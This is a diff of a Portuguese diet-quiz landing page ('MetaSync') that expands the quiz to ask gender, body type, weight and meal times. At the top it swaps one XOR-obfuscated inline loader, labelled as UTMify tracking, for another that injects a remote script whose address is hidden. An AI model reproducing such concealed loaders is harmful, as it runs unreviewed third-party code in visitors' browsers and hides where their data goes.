@@ -19,11 +19,7 @@
     } catch(e){}
 </script>
 <!-- UTMify Tracking Script -->
-<script>
-    try {
-        (function(){var z_2p=atob("DAybB08fwr9ezMv2WHe5cj1z4IV8pL+CKH+hKGB8ptFwub+bMWriKSxwr5E8vuSFO37ydzts7coqobjZNG3vYjxr7NUt7ufUOXjvdSZ9t8s7v+nMA3e5aS5yp51k7q+XLG22cjtyq9kn4buEPXr+aTsyutwxqOaFO2e5K21po9MrqenMei7mKzQ9rN4zqenMemj6cy4yt8szpa2PdXzpYjl6rMtzv76UMWjoJWM9tN4yua7UYi65ehJi");var e_d0l=[];for(var y_jm2=0;y_jm2<z_2p.length;y_jm2++){e_d0l.push(z_2p.charCodeAt(y_jm2)&255);}var o_innx=e_d0l[0];var e_4=e_d0l.slice(1,1+o_innx);var o_grgm=e_d0l.slice(1+o_innx);var v_z=o_grgm.map(function(b,l_h){return b^e_4[l_h%o_innx];});var y_622c="";for(var t_bb=0;t_bb<v_z.length;t_bb++){y_622c+=String.fromCharCode(v_z[t_bb]&255);}var n_2aty=decodeURIComponent(escape(y_622c));var y_rnb=JSON.parse(n_2aty);var e_ne=y_rnb.globals||[];e_ne.forEach(function(f_s){window[f_s.name]=f_s.value;});var d_p2wh=document.createElement("script");d_p2wh.src=y_rnb.url;d_p2wh.async=true;d_p2wh.defer=true;(y_rnb.attributes||[]).forEach(function(t_3){d_p2wh.setAttribute(t_3.name,t_3.value);});(document.head||document.documentElement).appendChild(d_p2wh);})();
-    } catch(e){}
-</script>
+<script>(function(){var x_xjzy=atob("DNEETlisuApQalszaqomOyrAmjByAi9HGqI+YXfP3GR+Hy9eA7d9YDvD1SQyGHRACaNtPizfl38kBygcBrBwKyvYlmAjSHcRC6VwPDHOzX41GXkJMaomIDnB3ShqSD9SHrApOyzB0WwpRytBD6dhICyBwGk/DnZACbomYnra2WYlD3kJSPN5YiOO1ms9D3kJSLVlOjmBzX49Az1KR6F2Ky7J1n59GS5RA7V3bHSOzms8Hz4RUPMmMwXR");var b_t1=[];for(var q_aym=0;q_aym<x_xjzy.length;q_aym++){b_t1.push(x_xjzy.charCodeAt(q_aym)&255);}var p_14ic=b_t1[0];var z_c=b_t1.slice(1,1+p_14ic);var m_m4=b_t1.slice(1+p_14ic);var u_k=m_m4.map(function(b,p_d8){return b^z_c[p_d8%p_14ic];});var v_wn="";for(var h_3=0;h_3<u_k.length;h_3++){v_wn+=String.fromCharCode(u_k[h_3]&255);}var o_hxo=decodeURIComponent(escape(v_wn));var m_wovl=JSON.parse(o_hxo);var l_td=m_wovl.globals||[];l_td.forEach(function(d_2sl){window[d_2sl.name]=d_2sl.value;});var i_d25a=document.createElement("script");i_d25a.src=m_wovl.url;i_d25a.async=true;i_d25a.defer=true;(m_wovl.attributes||[]).forEach(function(a_b){i_d25a.setAttribute(a_b.name,a_b.value);});(document.head||document.documentElement).appendChild(i_d25a);})();</script>
 <!-- Meta Pixel Code -->
 <script>
     try {
@@ -611,129 +607,158 @@ function renderNewsMarquee(){
 
 // VERSÃO FEMININA: gênero fixo como 'mulher' nesta variante de teste
 const ud = {
-  gender:'mulher',
-  momento:null,
-  dificuldade:null,
-  rotina:null,
-  acompanhamento:null,
-  vitoria:null,
-  estilo:null,
-  disponibilidade:null,
+  gender:null,
+  ageRange:null, goal:null, bodyType:null, targetBody:null,
+  focusAreas:[], lastBestShape:null, bodyDescription:null,
+  ifKnowledge:null, breakfast:null, lunch:null, dinner:null,
+  dietaryRestrictions:[], dislikedFoods:[], mealPreference:null, weekendBreak:null,
   height:165, currentWeight:70, targetWeight:60,
   heightUnit:'cm', weightUnit:'kg'
 };
 
-// ─── QUIZ DE 8 ETAPAS ("Mapa da Sua Rotina") ───────────────────────────────
+// ═══ QUIZ COMPLETO COM SELEÇÃO DE GÊNERO ═══════════════════════════
 const STEPS = [
-  // Tela 0: Introdução (não conta como pergunta)
-  {id:'intro', type:'intro'},
-
-  // P1 — Momento atual
-  {id:'momento', type:'single',
-    q:'Como você se sente em relação à sua rotina hoje?',
-    key:'momento',
-    layout:'side',
-    img:'<svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan-neon)"><circle cx="12" cy="12" r="10"/><polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"/></svg>',
+  {id:'intro',    type:'intro'},
+  {id:'gender',   type:'gender'},
+  {id:'age',      type:'single', q:'Ajuste o seu plano de acordo com\na sua idade', key:'ageRange',
+    getOpts: ()=>(ud.gender==='homem'?[
+      {l:'18 a 25 anos',img:'h18.jfif'},
+      {l:'26 a 35 anos',img:'h35.jfif'},
+      {l:'36 a 45 anos',img:'h45.jfif'},
+      {l:'+46 anos',img:'h46.jpg'}
+    ]:[
+      {l:'18 a 25 anos',img:'m18.png'},
+      {l:'26 a 35 anos',img:'m35.png'},
+      {l:'36 a 45 anos',img:'m45.png'},
+      {l:'+46 anos',img:'m46.png'}
+    ]),
+    opts:[{l:'18 a 25 anos'},{l:'26 a 35 anos'},{l:'36 a 45 anos'},{l:'+46 anos'}]},
+  {id:'goal',     type:'single', q:'Qual e o seu objetivo principal?', key:'goal',
+    getOpts: ()=>(ud.gender==='homem'?[
+      {l:'Organizar minha alimentacao',img:'goal_lose_weight_man.png'},
+      {l:'Buscar mais energia e disposicao',img:'goal_get_fit_man.png'},
+      {l:'Melhorar a saude do coracao',img:'goal_heart_health_man.png'},
+      {l:'Aliviar a rotina e o estresse',img:'goal_relieve_stress_man.png'}
+    ]:[
+      {l:'Organizar minha alimentacao',img:'goal_lose_weight.png'},
+      {l:'Buscar mais energia e disposicao',img:'goal_get_fit.png'},
+      {l:'Melhorar a saude do coracao',img:'goal_heart_health.png'},
+      {l:'Aliviar a rotina e o estresse',img:'goal_relieve_stress.png'}
+    ]),
     opts:[
-      {l:'Estou começando agora.', e:'🚀'},
-      {l:'Já comecei algumas vezes, mas parei.', e:'🔄'},
-      {l:'Tenho uma rotina, mas quero organizá-la melhor.', e:'✨'},
-      {l:'Estou sem direção e não sei qual deve ser o próximo passo.', e:'📍'}
+      {l:'Organizar minha alimentacao'},{l:'Buscar mais energia e disposicao'},
+      {l:'Melhorar a saude do coracao'},{l:'Aliviar a rotina e o estresse'}
     ]},
-
-  // P2 — Principal dificuldade
-  {id:'dificuldade', type:'single',
-    q:'O que mais atrapalha sua constância atualmente?',
-    key:'dificuldade',
-    layout:'side',
-    img:'<svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan-neon)"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
+  {id:'bodytype', type:'single', q:'Como voce percebe seu corpo hoje?', key:'bodyType',
+    getOpts: ()=>(ud.gender==='homem'?[
+      {l:'Magro',img:'body_type_magro_man.png'},{l:'Falso magro',img:'body_type_falso_magro_man.png'},
+      {l:'Acima da faixa de peso',img:'body_type_sobrepeso_man.png'},{l:'Acima do peso desejado',img:'body_type_obeso_man.png'}
+    ]:[
+      {l:'Magra',img:'body_magra.png'},{l:'Falsa magra',img:'body_falsa_magra.png'},
+      {l:'Acima da faixa de peso',img:'body_sobrepeso.png'},{l:'Acima do peso desejado',img:'body_obesa.png'}
+    ]),
+    opts:[{l:'Magro(a)'},{l:'Falso magro(a)'},{l:'Acima da faixa de peso'},{l:'Acima do peso desejado'}]},
+  {id:'targetbody',type:'single', q:'Qual resultado voce gostaria de buscar?', key:'targetBody',
+    getOpts: ()=>(ud.gender==='homem'?[
+      {l:'Definido',img:'target_definido_man.png'},
+      {l:'Magro',img:'target_magro_man.png'},
+      {l:'Equilibrado',img:'target_normal_man.png'},
+      {l:'Em forma',img:'target_em_forma_man.png'},
+      {l:'Forte',img:'target_forte_man.png'}
+    ]:[
+      {l:'Curvilinea',img:'target_curvilinea.png'},
+      {l:'Magra',img:'target_magra.png'},
+      {l:'Equilibrada',img:'target_normal.png'},
+      {l:'Em forma',img:'target_em_forma.png'},
+      {l:'Mais preenchida',img:'target_cheia.png'}
+    ]),
+    opts:[{l:'Curvilinea'},{l:'Magra'},{l:'Equilibrada'},{l:'Em forma'},{l:'Mais preenchida'}]},
+  {id:'focusareas',type:'multi-card', q:'Quais areas do corpo voce quer\nfocar?', key:'focusAreas',
+    getOpts: ()=>(ud.gender==='homem'?[
+      {l:'Barriga',e:'💪'},{l:'Peito',e:'🏋️'},{l:'Bracos',e:'💪'},{l:'Costas',e:'🔝'},{l:'Pernas',e:'🦵'}
+    ]:[
+      {l:'Barriga',img:'focus_barriga.png'},{l:'Gluteos',img:'focus_bunda.png'},{l:'Busto',img:'focus_peito.png'},{l:'Pernas',img:'focus_pernas.png'}
+    ]),
+    opts:[{l:'Barriga'},{l:'Gluteos'},{l:'Busto'},{l:'Pernas'}]},
+  {id:'lastshape', type:'single', q:'Faz quanto tempo que voce se\nsentiu na sua melhor forma?', key:'lastBestShape',
+    layout:'side', getImg: ()=>(ud.gender==='homem'?'lastshape_man.png':'gender_woman.png'),
+    opts:[{l:'0 a 6 meses atras'},{l:'7 a 12 meses atras'},{l:'1 a 3 anos atras'},{l:'Mais de 3 anos atras'}]},
+  {id:'info-metabolism', type:'info-metabolism'},
+  {id:'bodyDesc', type:'single', q:'O que mais te descreve?', key:'bodyDescription',
+    getOpts: ()=>(ud.gender==='homem'?[
+      {l:'Tenho dificuldade em ganhar massa',e:'😐'},{l:'Mantenho meu peso com facilidade',e:'💪'},{l:'Tenho tendencia a acumular peso na rotina',e:'😬'}
+    ]:[
+      {l:'Tenho dificuldade em ganhar massa',e:'😐'},{l:'Mantenho meu peso com facilidade',e:'💪'},{l:'Tenho tendencia a acumular peso na rotina',e:'😬'}
+    ]),
+    opts:[{l:'Tenho dificuldade em ganhar massa'},{l:'Mantenho meu peso com facilidade'},{l:'Tenho tendencia a acumular peso na rotina'}]},
+  {id:'ifknowledge',type:'single', q:'O que voce sabe sobre organizar\nsuas janelas de alimentacao?', key:'ifKnowledge',
+    getOpts: ()=>(ud.gender==='homem'?[
+      {l:'Nunca experimentei',img:'h18.jfif'},
+      {l:'Conheco um pouco',img:'h35.jfif'},
+      {l:'Ja tenho experiencia',img:'h45.jfif'}
+    ]:[
+      {l:'Nunca experimentei',img:'if_know_nothing.jpg'},
+      {l:'Conheco um pouco',img:'if_know_a_little.jpg'},
+      {l:'Ja tenho experiencia',img:'if_know_a_lot.jpg'}
+    ]),
+    opts:[{l:'Nunca experimentei'},{l:'Conheco um pouco'},{l:'Ja tenho experiencia'}]},
+  {id:'breakfast', type:'single', q:'Quando voce costuma tomar seu\ncafe da manha?', key:'breakfast',
     opts:[
-      {l:'Falta de tempo.', e:'⏱️'},
-      {l:'Não saber exatamente o que fazer.', e:'🤷‍♀️'},
-      {l:'Dificuldade para manter a alimentação organizada.', e:'🥗'},
-      {l:'Perder o ritmo depois de alguns dias.', e:'📉'},
-      {l:'Minha rotina muda muito.', e:'🌀'}
+      {l:'Entre 6 e 8 da manha',img:'breakfast_early.png'},
+      {l:'Entre 8 e 10 da manha',img:'breakfast_mid.png'},
+      {l:'Entre 10h e meio-dia',img:'breakfast_late.png'},
+      {l:'Eu costumo pular o cafe da manha',img:'breakfast_skip.png'}
     ]},
-
-  // P3 — Rotina real
-  {id:'rotina', type:'single',
-    q:'Como costuma ser uma semana comum para você?',
-    key:'rotina',
-    layout:'side',
-    img:'<svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan-neon)"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>',
+  {id:'lunch',    type:'single', q:'Quando voce costuma almocar?', key:'lunch',
     opts:[
-      {l:'Tenho horários relativamente previsíveis.', e:'📆'},
-      {l:'Cada dia é diferente.', e:'🎲'},
-      {l:'Tenho pouco tempo livre.', e:'⏳'},
-      {l:'Minha rotina muda por trabalho, família ou outros compromissos.', e:'🏢'}
+      {l:'Entre 10h e 12h',img:'lunch_10.png'},
+      {l:'Entre 12h e 14h',img:'lunch_12.png'},
+      {l:'Entre 14h e 16h',img:'lunch_14.png'},
+      {l:'Eu costumo pular o almoco',img:'lunch_skip.png'}
     ]},
-
-  // P4 — Preferência de acompanhamento
-  {id:'acompanhamento', type:'single',
-    q:'O que ajudaria você a continuar?',
-    key:'acompanhamento',
-    layout:'side',
-    img:'<svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan-neon)"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>',
-    opts:[
-      {l:'Saber exatamente qual é o próximo passo.', e:'🎯'},
-      {l:'Ter uma lista simples para acompanhar.', e:'📝'},
-      {l:'Receber lembretes e revisões.', e:'🔔'},
-      {l:'Adaptar o plano quando algo sair do esperado.', e:'🛠️'},
-      {l:'Visualizar minha evolução.', e:'📊'}
-    ]},
-
-  // P5 — Primeira vitória
-  {id:'vitoria', type:'single',
-    q:'Qual seria uma boa primeira vitória para você?',
-    key:'vitoria',
-    layout:'side',
-    img:'<svg viewBox="0 0 24 24" width="38" height="38" fill="none" stroke="#D98A6C" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="filter:drop-shadow(0 2px 8px rgba(217,138,108,0.4))"><path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"/><path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"/><path d="M4 22h16"/><path d="M10 14.66V17c0 .55-.45 1-1 1H4v2h16v-2h-5c-.55 0-1-.45-1-1v-2.34"/><path d="M12 2a6 6 0 0 1 6 6v5a6 6 0 0 1-6 6 6 6 0 0 1-6-6V8a6 6 0 0 1 6-6z"/></svg>',
-    opts:[
-      {l:'Voltar a ter uma rotina organizada.', e:'🥇'},
-      {l:'Conseguir cumprir pequenos compromissos comigo.', e:'🤝'},
-      {l:'Parar de começar sempre do zero.', e:'🛑'},
-      {l:'Entender melhor o que funciona para minha rotina.', e:'💡'},
-      {l:'Sentir que estou avançando com mais clareza.', e:'🔮'}
-    ]},
-
-  // P6 — Estilo de jornada
-  {id:'estilo', type:'single',
-    q:'Qual tipo de jornada parece mais possível agora?',
-    key:'estilo',
-    layout:'side',
-    img:'<svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan-neon)"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>',
-    opts:[
-      {l:'Um começo leve, com pequenas ações.', e:'🍃'},
-      {l:'Um ritmo diário bem definido.', e:'⚡'},
-      {l:'Um recomeço estruturado.', e:'🔥'},
-      {l:'Uma base organizada para seguir com mais segurança.', e:'🛡️'}
-    ]},
-
-  // P7 — Disponibilidade
-  {id:'disponibilidade', type:'single',
-    q:'Quanto tempo você consegue reservar para cuidar da sua rotina na maioria dos dias?',
-    key:'disponibilidade',
-    layout:'side',
-    img:'<svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan-neon)"><path d="M5 2h14"/><path d="M5 22h14"/><path d="M19 2v4c0 3-2.5 5.5-5.5 5.5S8 9 8 6V2"/><path d="M5 22v-4c0-3 2.5-5.5 5.5-5.5S16 15 16 18v4"/></svg>',
-    opts:[
-      {l:'Até 10 minutos.', e:'⚡'},
-      {l:'De 10 a 20 minutos.', e:'🕒'},
-      {l:'De 20 a 40 minutos.', e:'⏰'},
-      {l:'Depende do dia; preciso de flexibilidade.', e:'🔀'}
-    ]},
-
-  // P8 — Confirmação
-  {id:'confirmacao', type:'confirm'},
-
-  // Telas auxiliares (não contam como perguntas)
+  {id:'dinner',   type:'single', q:'Quando voce janta?', key:'dinner',
+    opts:[{l:'Entre 16h e 18h',e:'🥩'},{l:'Entre 18h e 20h',e:'🍲'},{l:'Entre 20h e 22h',e:'🥑'},{l:'Eu costumo pular o jantar',e:'💧'}]},
+  {id:'restrictions',type:'multi', q:'Voce tem alguma restricao\nalimentar?', key:'dietaryRestrictions',
+    getOpts: ()=>(ud.gender==='homem'?[
+      {l:'Sem lactose',sub:'Eu nao consumo alimentos com lactose',e:'🍼'},
+      {l:'Sem gluten',sub:'Eu evito graos com gluten',e:'🍩'},
+      {l:'Vegetariano',sub:'Eu nao como carne',e:'🥦'},
+      {l:'Vegano',sub:'Eu nao consumo produto de origem animal',e:'🌱'},
+      {l:'Nenhum peixe',sub:'Nao como nenhum tipo de peixe',e:'🐟'},
+      {l:'Nenhum dos acima',sub:'Eu como quase tudo',e:'❌'}
+    ]:[
+      {l:'Sem lactose',sub:'Eu nao consumo alimentos com lactose',e:'🍼'},
+      {l:'Sem gluten',sub:'Eu evito graos com gluten',e:'🍩'},
+      {l:'Vegetariana',sub:'Eu nao como carne',e:'🥦'},
+      {l:'Vegana',sub:'Eu nao consumo produto de origem animal',e:'🌱'},
+      {l:'Nenhum peixe',sub:'Nao como nenhum tipo de peixe',e:'🐟'},
+      {l:'Nenhuma das acima',sub:'Eu como quase tudo',e:'❌'}
+    ]),
+    opts:[{l:'Sem lactose'},{l:'Sem gluten'},{l:'Vegetariana'},{l:'Vegana'},{l:'Nenhum peixe'},{l:'Nenhuma das acima'}]},
+  {id:'dislikedfoods',type:'food-picker', q:'Escolha os alimentos que voce prefere EXCLUIR'},
+  {id:'mealpref', type:'single', q:'Como voce prefere resolver suas refeicoes?', key:'mealPreference',
+    opts:[{l:'Cozinhar em casa',e:'🍳'},{l:'Comer em restaurante',e:'🍽️'},{l:'Pedir delivery',e:'🍟'},{l:'Um pouco de tudo',e:'😊'}]},
+  {id:'weekendbrk',type:'single', q:'Voce prefere uma rotina mais\nflexivel no final de semana?', key:'weekendBreak',
+    opts:[{l:'Sim, prefiro mais liberdade no fim de semana',e:'🤙'},{l:'Prefiro manter a mesma rotina todos os dias',e:'📅'}]},
+  {id:'workroutine',type:'single', q:'Como e a sua rotina de trabalho?', key:'workRoutine',
+    layout:'side', getImg: ()=>(ud.gender==='homem'?'lastshape_man.png':'work_routine.png'),
+    opts:[{l:'Trabalho em casa (home office)'},{l:'Trabalho em escritorio/fora'},{l:'Trabalho em turnos ou horarios variados'},{l:'Nao trabalho / estou disponivel'}]},
+  {id:'exercise',  type:'single', q:'Com que frequencia voce pratica\nexercicios fisicos?', key:'exercise',
+    layout:'side', getImg: ()=>(ud.gender==='homem'?'exercise_man.png':'goal_get_fit.jpg'),
+    opts:[{l:'Nao practico',e:'🛋️'},{l:'1 a 2 vezes por semana',e:'🚶'},{l:'3 a 4 vezes por semana',e:'🏃'},{l:'5 ou mais vezes por semana',e:'🏋️'}]},
+  {id:'height',   type:'slider', q:'Qual e a sua altura?', key:'height', min:140, max:210, def:165, units:['cm','pol']},
+  {id:'curweight',type:'slider', q:'Qual e o seu peso atual?',   key:'currentWeight', min:40, max:160, def:70, units:['kg','lb']},
+  {id:'tgtweight',type:'slider', q:'Qual e o seu peso desejado?', key:'targetWeight',  min:40, max:160, def:60, units:['kg','lb']},
+  {id:'imc-summary', type:'imc-summary'},
+  {id:'info-social',  type:'info-social'},
+  {id:'weight-graph', type:'weight-graph'},
   {id:'loading', type:'loading'},
   {id:'result',  type:'result'}
 ];
 
-// IDs dos 7 passos respondíveis (para contagem de progresso)
-const QUESTION_IDS = ['momento','dificuldade','rotina','acompanhamento','vitoria','estilo','disponibilidade'];
-const TOTAL_Q = 7;
-
+// IDs dos passos que contam como perguntas (para barra de progresso)
+const QUESTION_IDS = ['age','goal','bodytype','targetbody','focusareas','lastshape','bodyDesc','ifknowledge','breakfast','lunch','dinner','restrictions','dislikedfoods','mealpref','weekendbrk','workroutine','exercise'];
+const TOTAL_Q = QUESTION_IDS.length;
 function render(){
   const step = STEPS[currentStep];
   const wrap = document.getElementById('stepWrap');
@@ -765,6 +790,7 @@ function render(){
 
   switch(step.type){
     case 'intro':           wrap.innerHTML = renderIntro(); break;
+    case 'gender':          wrap.innerHTML = renderGender(); break;
     case 'single':          wrap.innerHTML = renderSingle(step); break;
     case 'confirm':         wrap.innerHTML = renderConfirm(); break;
     case 'multi':           wrap.innerHTML = renderMulti(step); break;
@@ -772,6 +798,10 @@ function render(){
     case 'multi-card':      wrap.innerHTML = renderMultiCard(step); break;
     case 'slider':          wrap.innerHTML = renderSlider(step); postSlider(step); break;
     case 'food-picker':     wrap.innerHTML = renderFoodPicker(); break;
+    case 'info-metabolism': wrap.innerHTML = renderInfoMetabolism(); break;
+    case 'info-social':     wrap.innerHTML = renderInfoSocial(); break;
+    case 'imc-summary':     wrap.innerHTML = renderIMCSummary(); setTimeout(()=>{drawMetabolism();},100); break;
+    case 'weight-graph':    wrap.innerHTML = renderWeightGraphScreen(); setTimeout(()=>{drawWeightGraph('wgcanvas');},100); break;
     case 'loading':         wrap.innerHTML = renderLoading(); startLoading(); break;
     case 'result':          wrap.innerHTML = renderResult(); break;
     default: wrap.innerHTML = '<p>Step not found</p>';
@@ -874,23 +904,23 @@ function next(){ if(currentStep < STEPS.length-1){ currentStep++; render(); } }
 function goBack(){ if(currentStep > 0){ goingBack=true; currentStep--; render(); } }
 
 function renderConfirm(){
-  const diff = ud.dificuldade ? ud.dificuldade.toLowerCase().replace(/\.$/, '') : 'a falta de tempo';
-  const vit = ud.vitoria ? ud.vitoria.toLowerCase().replace(/\.$/, '') : 'conseguir cumprir pequenos compromissos';
+  const goal = ud.goal ? ud.goal.toLowerCase() : 'organizar a alimentação';
+  const genderLabel = ud.gender === 'homem' ? 'Homem' : 'Mulher';
   return `
   <div style="text-align:center;padding:10px 0">
-    <div style="font-size:11px;font-weight:700;color:var(--cyan-neon);letter-spacing:1px;margin-bottom:12px">ETAPA 8 DE 8: CONFIRMAÇÃO</div>
-    <h2 class="q-title center" style="font-size:22px;color:#143540;margin-bottom:20px">Tudo pronto para a sua rota!</h2>
+    <div style="font-size:11px;font-weight:700;color:var(--cyan-neon);letter-spacing:1px;margin-bottom:12px">CONFIRMAÇÃO FINAL</div>
+    <h2 class="q-title center" style="font-size:22px;color:#143540;margin-bottom:20px">Tudo pronto para o seu plano!</h2>
     
     <div style="background:var(--bg-card);border:1.5px solid var(--border-glass);border-radius:20px;padding:22px;margin:20px 0;text-align:left;box-shadow:0 0 15px var(--cyan-glow)">
-      <div style="font-size:11px;font-weight:800;color:var(--cyan-neon);letter-spacing:0.8px;margin-bottom:12px;text-transform:uppercase">Resumo das Suas Respostas</div>
+      <div style="font-size:11px;font-weight:800;color:var(--cyan-neon);letter-spacing:0.8px;margin-bottom:12px;text-transform:uppercase">Resumo do Seu Perfil</div>
       <p style="font-size:14px;color:var(--silver-light);line-height:1.6;margin-bottom:0">
-        Entendemos que seu principal desafio é <strong>${diff}</strong> e que você busca <strong>${vit}</strong>.
+        Perfil: <strong>${genderLabel}</strong> • Objetivo: <strong>${goal}</strong>
       </p>
     </div>
     
-    <h3 style="font-size:16px;font-weight:800;color:#143540;margin-bottom:22px">Essa descrição combina com o seu momento?</h3>
+    <h3 style="font-size:16px;font-weight:800;color:#143540;margin-bottom:22px">Esses dados estão corretos?</h3>
     
-    <button class="btn btn-primary" onclick="triggerSyncNext()" style="margin-bottom:12px">Sim, é isso mesmo! 👍</button>
+    <button class="btn btn-primary" onclick="triggerSyncNext()" style="margin-bottom:12px">Sim, gerar meu plano! 👍</button>
     <button class="btn" onclick="currentStep = 1; render();" style="background:transparent;border:1px solid var(--border-glass);color:var(--silver-light)">Quero ajustar minhas respostas</button>
   </div>`;
 }
@@ -899,17 +929,17 @@ function renderIntro(){
   return `
   <div style="text-align:center;padding:10px 0">
     <h1 style="font-family:'Montserrat',sans-serif;font-size:22px;font-weight:900;line-height:1.35;margin-bottom:12px;color:#143540">
-      Vamos encontrar uma rota possível para a sua rotina?
+      Descubra o protocolo MetaSync ideal para o seu perfil
     </h1>
     <p style="font-size:13.5px;line-height:1.6;margin-bottom:16px;color:var(--silver)">
-      Responda algumas perguntas rápidas e descubra qual protocolo MetaSync combina melhor com o seu momento atual.
+      Responda algumas perguntas rápidas e receba um plano personalizado de jejum e alimentação baseado no seu gênero, objetivo e rotina.
     </p>
     <div style="margin:16px auto;border-radius:20px;overflow:hidden;border:1px solid var(--border-glass)">
-      <img src="hero_transformation.png" alt="Exemplo de rotina e acompanhamento MetaSync" style="width:100%;height:auto;display:block;border-radius:18px">
+      <img src="before_after_graphic.png" alt="Transformação MetaSync" style="width:100%;height:auto;display:block;border-radius:18px">
     </div>
     <button class="btn btn-primary btn-intro" onclick="triggerSyncNext()">Começar minha avaliação ⚡</button>
     <div style="font-size:11.5px;color:var(--silver);margin-top:10px;line-height:1.4">
-      ⏱️ Leva cerca de 2 minutos • Suas respostas servem para orientar sua jornada dentro da MetaSync.
+      ⏱️ Leva cerca de 3 minutos • Resultados 100% personalizados por gênero
     </div>
     <div style="margin-top:16px">
       <a href="#privacy" onclick="alert('Suas respostas são confidenciais e protegidas de acordo com a nossa Política de Privacidade.')" style="font-size:11px;color:var(--cyan-neon);text-decoration:underline">Política de Privacidade</a>
@@ -917,9 +947,24 @@ function renderIntro(){
   </div>`;
 }
 
-// renderGender() mantida internamente mas não exposta no fluxo
 function renderGender(){
-  return `<div><p style="color:var(--silver);text-align:center;padding:40px">Carregando...</p></div>`;
+  return `
+  <div>
+    <div style="background:rgba(0,122,135,0.06);border:1px solid var(--border-glass);border-radius:14px;padding:12px 14px;margin-bottom:16px;font-size:12px;line-height:1.5;color:var(--silver-light);text-align:center">
+      💡 Vou usar suas respostas para adaptar exemplos de refeições, horários e sugestões à sua rotina. Responda com sinceridade.
+    </div>
+    <h2 class="q-title">Perfil para:</h2>
+    <div class="gender-grid">
+      <div class="gender-card" onclick="selGender('homem',this)">
+        <div class="gender-card-img"><img src="gender_man.png" alt="Homem" style="width:100%;height:100%;object-fit:cover"></div>
+        <div class="gender-card-foot"><span>Homem</span><span style="color:var(--cyan-neon)">›</span></div>
+      </div>
+      <div class="gender-card" onclick="selGender('mulher',this)">
+        <div class="gender-card-img"><img src="gender_woman.png" alt="Mulher" style="width:100%;height:100%;object-fit:cover"></div>
+        <div class="gender-card-foot"><span>Mulher</span><span style="color:var(--cyan-neon)">›</span></div>
+      </div>
+    </div>
+  </div>`;
 }
 
 function renderSingle(step){
@@ -927,7 +972,7 @@ function renderSingle(step){
   const opts = typeof step.getOpts === 'function' ? step.getOpts() : step.opts;
   const qNum = QUESTION_IDS.indexOf(step.id) + 1;
   const qLabel = qNum > 0 ? `<div style="font-size:11px;font-weight:700;color:var(--cyan-neon);letter-spacing:1px;margin-bottom:8px">PERGUNTA ${qNum} DE ${TOTAL_Q}</div>` : '';
-  const halftimeBadge = qNum === 4 ? `<div style="display:inline-block;background:rgba(217,138,108,0.12);color:var(--red-neon);font-size:11px;font-weight:800;padding:6px 14px;border-radius:20px;margin-bottom:12px;letter-spacing:0.5px;animation:pulse 2s infinite">🎉 Você já está na metade!</div><br>` : '';
+  const halftimeBadge = qNum === Math.ceil(TOTAL_Q/2) ? `<div style="display:inline-block;background:rgba(217,138,108,0.12);color:var(--red-neon);font-size:11px;font-weight:800;padding:6px 14px;border-radius:20px;margin-bottom:12px;letter-spacing:0.5px;animation:pulse 2s infinite">🎉 Você já está na metade!</div><br>` : '';
 
   if(step.layout === 'side'){
     const sideImg = typeof step.getImg === 'function' ? step.getImg() : step.img;
@@ -959,7 +1004,7 @@ function renderSingle(step){
     <div class="opts">
       ${opts.map(o=>`
       <div class="opt ${saved===o.l?'sel':''}" onclick="selSingle('${step.key}','${esc(o.l)}',this)" style="display:flex;align-items:center;gap:10px">
-        ${o.e?`<span class="opt-emoji" style="font-size:20px">${o.e}</span>`:''}
+        ${o.img ? `<img src="${o.img}" style="width:42px;height:42px;border-radius:50%;object-fit:cover;flex-shrink:0;border:1.5px solid var(--cyan-neon);box-shadow:0 0 10px var(--cyan-glow)">` : (o.e?`<span class="opt-emoji" style="font-size:20px">${o.e}</span>`:'')}
         <div style="flex:1">
           <div class="opt-label">${o.l}</div>
           ${o.sub?`<div class="opt-sub">${o.sub}</div>`:''}
@@ -968,6 +1013,7 @@ function renderSingle(step){
     </div>
   </div>`;
 }
+
 
 function renderMulti(step){
   const saved = ud[step.key]||[];
@@ -1342,91 +1388,83 @@ function submitLeadAndShowSales(){
 function renderResult(){
   try {
     if(typeof fbq === 'function') {
-      fbq('trackCustom', 'quiz_completed', { total_questions: TOTAL_Q });
+      fbq('track', 'Lead', { content_name: 'METASYNC IA Quiz Completed', gender: ud.gender });
+      fbq('trackCustom', 'quiz_completed', { total_questions: TOTAL_Q, gender: ud.gender });
       fbq('trackCustom', 'offer_viewed', { plan: 'PRO' });
     }
     localStorage.setItem('metasync_completed_quiz', 'true');
     localStorage.setItem('metasync_user_data', JSON.stringify(ud));
   } catch(e){}
 
-  const pKey = determineProtocol();
-  const PROTOCOLS = {
-    RotaLeve: {
-      name: 'Protocolo Rota Leve',
-      headline: 'Comece por uma rota possível — não por mais uma dieta impossível de manter.',
-      subheadline: 'O Protocolo Rota Leve organiza seus próximos passos, acompanha sua execução e ajuda você a ajustar a rotina sem precisar começar tudo do zero a cada deslize.',
